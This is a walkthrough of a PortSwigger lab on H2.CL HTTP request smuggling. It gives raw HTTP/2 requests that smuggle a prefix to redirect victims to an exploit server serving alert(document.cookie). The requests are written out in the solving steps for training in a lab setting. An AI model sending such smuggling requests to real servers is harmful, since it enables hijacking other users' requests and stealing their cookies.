#  H2.CL Request Smuggling

## 📌 Lab Details
- **Title**: H2.CL Request Smuggling
- **Difficulty**: Practitioner
- **Category**: HTTP Request Smuggling
- **Lab URL**: https://portswigger.net/academy/labs/launch/94fed48630d16b9adc01888e546e50f8e94c1bae77065a94140339f20303ef55?referrer=%2fweb-security%2frequest-smuggling%2fadvanced%2flab-request-smuggling-h2-cl-request-smuggling

## 🔍 Summary
This lab shows how **H2.CL request smuggling** works when a **front-end server downgrades HTTP/2 to HTTP/1.1**, but mishandles `Content-Length`. By smuggling a **partial request** for `/resources`, we can cause the victim’s browser to be redirected to our exploit server, which hosts malicious JavaScript.

## 🛠 Steps to Solve
1. Try smuggling an arbitrary prefix in the body of an HTTP/2 request by including a `Content-Length: 0` header as follows:
   ```sh
   POST / HTTP/2
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Length: 0

   SMUGGLED
   ```
2. Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.
3. Using Burp Repeater, notice that if you send a request for GET /resources, you are redirected to `https://YOUR-LAB-ID.web-security-academy.net/resources/`.
4. Create the following request to smuggle the start of a request for `/resources`, along with an arbitrary `Host` header:
   ```sh
   POST / HTTP/2
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Length: 0

   GET /resources HTTP/1.1
   Host: foo
   Content-Length: 5

   x=1
   ```
5. Send the request a few times. Notice that smuggling this prefix past the front-end allows you to redirect the subsequent request on the connection to an arbitrary host.
6. Go to the exploit server and change the file path to `/resources`. In the body, enter the payload `alert(document.cookie)`, then store the exploit.
7. In Burp Repeater, edit your malicious request so that the `Host` header points to your exploit server:
   ```sh
   POST / HTTP/2
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Length: 0

   GET /resources HTTP/1.1
   Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
   Content-Length: 5

   x=1
   ```
8. Send the request a few times and confirm that you receive a redirect to the exploit server.
9. Resend the request and wait for 10 seconds or so. The victim will now send the request and the lab will be solved.

## 📖 Key Takeaways
- **H2.CL desync**: Occurs when HTTP/2 requests with ambiguous length are downgraded to HTTP/1.1 and misinterpreted.
- You can **smuggle a prefix request** into the back-end, tricking it into misrouting subsequent victim requests.
- **Timing is crucial** → the poison must land just before the victim loads `/resources`.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/e56050a9-1e47-423e-b4e8-dd540240e859" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/f804f594-9461-4e83-aa43-e91a16c7a8dd" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/f6aea489-6464-4332-8a6c-e6231676a30b" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c12135d4-4c75-4b84-8285-8fc431d29b32" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d434bcea-8c94-4119-8023-93288d9beb6e" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/53393c04-f3a5-48e0-810e-e8d596ecfc37" />
